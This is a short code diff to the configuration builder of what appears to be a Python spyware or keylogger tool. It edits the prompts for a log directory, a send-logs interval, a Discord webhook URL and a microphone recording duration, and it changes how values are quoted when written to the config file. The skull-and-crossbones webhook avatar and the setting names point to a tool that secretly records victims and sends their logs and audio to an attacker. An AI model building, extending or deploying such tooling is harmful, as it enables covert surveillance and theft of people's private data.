@@ -129,13 +129,13 @@ def main():
 
     config_values = {
         "LOG_DIRECTORY_PATH": input(
-            "Enter the log directory path WITH QUOTATION MARKS AROUND IT (hit enter for default value os.path.join(tempfile.gettempdir(), 'logs')): "
+            "Enter the log directory path (hit enter for default value os.path.join(tempfile.gettempdir(), 'logs')): "
         ),
         "SEND_LOGS_INTERVAL_SEC": input(
             "Enter the send logs interval in seconds (hit enter for default value 1000): "
         ),
         "DISCORD_WEBHOOK_URL": input(
-            "Enter the Discord webhook URL WITH QUOTATION MARKS AROUND IT (THE PROGRAM WILL NOT FUNCTION WITHOUT THIS): "
+            "Enter the Discord webhook (THE PROGRAM WILL NOT FUNCTION WITHOUT THIS): "
         ),
         "MICROPHONE_RECORD_DURATION_SEC": input(
             "Enter the microphone record duration in seconds (hit enter for default value 60): "
@@ -171,7 +171,10 @@ def main():
             if value == "":
                 configfile.write(f"{key} = {default_values[key]}\n")
             else:
-                configfile.write(f"{key} = {value}\n")
+                if key in ["LOG_DIRECTORY_PATH", "DISCORD_WEBHOOK_URL"]:
+                    configfile.write(f"{key} = \"{value}\"\n")
+                else:
+                    configfile.write(f"{key} = {value}\n")
 
         configfile.write(
             'DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"\n'
